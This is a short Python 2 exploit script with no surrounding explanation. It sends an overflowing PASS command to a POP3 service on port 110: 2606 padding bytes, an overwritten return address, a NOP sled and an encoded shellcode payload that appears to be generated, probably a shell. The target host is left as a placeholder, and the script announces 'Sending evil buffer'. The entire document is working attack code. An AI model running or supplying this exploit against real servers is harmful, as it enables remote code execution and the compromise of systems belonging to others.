import struct

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 10
buf += b"\xd9\xe1\xbd\xbf\xf0\x5a\x12\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x52\x31\x6a\x17\x83\xea\xfc\x03\xd5\xe3\xb8"
buf += b"\xe7\xd5\xec\xbf\x08\x25\xed\xdf\x81\xc0\xdc\xdf\xf6"
buf += b"\x81\x4f\xd0\x7d\xc7\x63\x9b\xd0\xf3\xf0\xe9\xfc\xf4"
buf += b"\xb1\x44\xdb\x3b\x41\xf4\x1f\x5a\xc1\x07\x4c\xbc\xf8"
buf += b"\xc7\x81\xbd\x3d\x35\x6b\xef\x96\x31\xde\x1f\x92\x0c"
buf += b"\xe3\x94\xe8\x81\x63\x49\xb8\xa0\x42\xdc\xb2\xfa\x44"
buf += b"\xdf\x17\x77\xcd\xc7\x74\xb2\x87\x7c\x4e\x48\x16\x54"
buf += b"\x9e\xb1\xb5\x99\x2e\x40\xc7\xde\x89\xbb\xb2\x16\xea"
buf += b"\x46\xc5\xed\x90\x9c\x40\xf5\x33\x56\xf2\xd1\xc2\xbb"
buf += b"\x65\x92\xc9\x70\xe1\xfc\xcd\x87\x26\x77\xe9\x0c\xc9"
buf += b"\x57\x7b\x56\xee\x73\x27\x0c\x8f\x22\x8d\xe3\xb0\x34"
buf += b"\x6e\x5b\x15\x3f\x83\x88\x24\x62\xcc\x7d\x05\x9c\x0c"
buf += b"\xea\x1e\xef\x3e\xb5\xb4\x67\x73\x3e\x13\x70\x74\x15"
buf += b"\xe3\xee\x8b\x96\x14\x27\x48\xc2\x44\x5f\x79\x6b\x0f"
buf += b"\x9f\x86\xbe\x80\xcf\x28\x11\x61\xbf\x88\xc1\x09\xd5"
buf += b"\x06\x3d\x29\xd6\xcc\x56\xc0\x2d\x87\x98\xbd\x2c\x44"
buf += b"\x71\xbc\x2e\x6e\x53\x49\xc8\x04\x43\x1c\x43\xb1\xfa"
buf += b"\x05\x1f\x20\x02\x90\x5a\x62\x88\x17\x9b\x2d\x79\x5d"
buf += b"\x8f\xda\x89\x28\xed\x4d\x95\x86\x99\x12\x04\x4d\x59"
buf += b"\x5c\x35\xda\x0e\x09\x8b\x13\xda\xa7\xb2\x8d\xf8\x35"
buf += b"\x22\xf5\xb8\xe1\x97\xf8\x41\x67\xa3\xde\x51\xb1\x2c"
buf += b"\x5b\x05\x6d\x7b\x35\xf3\xcb\xd5\xf7\xad\x85\x8a\x51"
buf += b"\x39\x53\xe1\x61\x3f\x5c\x2c\x14\xdf\xed\x99\x61\xe0"
buf += b"\xc2\x4d\x66\x99\x3e\xee\x89\x70\xfb\x1e\xc0\xd8\xaa"
buf += b"\xb6\x8d\x89\xee\xda\x2d\x64\x2c\xe3\xad\x8c\xcd\x10"
buf += b"\xad\xe5\xc8\x5d\x69\x16\xa1\xce\x1c\x18\x16\xee\x34"

try:
	print "\nSending evil buffer..."
	s.connect(('Target ip',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buf + '\r\n')
	data = s.recv(1024)
	s.close()
except:
	print "Could not connect to POP3!"
